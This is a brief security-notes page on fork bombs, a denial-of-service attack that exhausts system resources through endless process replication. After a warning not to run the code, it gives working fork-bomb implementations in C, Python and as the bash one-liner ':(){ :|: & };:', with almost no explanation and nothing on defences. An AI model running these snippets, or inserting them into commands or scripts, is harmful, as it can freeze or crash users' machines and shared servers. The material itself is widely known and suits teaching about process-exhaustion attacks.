---
title: Fork Bomb
description: Fork Bomb is one of the denial-of-service attacks which lead the system to deplete the available resources by replicating a child process infinitely.
tags:
    - Linux
refs:
    - https://www.geeksforgeeks.org/zombie-processes-prevention/?ref=ml_lbp
    - https://www.imperva.com/learn/ddos/fork-bomb/
date: 2023-07-24
draft: false
---

### Warning

**Please don’t execute the following programs in system that you don’t want to harm.**

## Exploitation in C

This program forks child processes continuously.

```c
#include <stdio.h>
#include <sys/types.h>

int main()
{
	while (1)
		// Create a child process from the parent process.
		fork();
	return 0;
}
```

## Exploitation in Python

```python
import os

while True:
	os.fork()
```

## Exploitation in Bash

```bash
:(){ :|: & };:
```
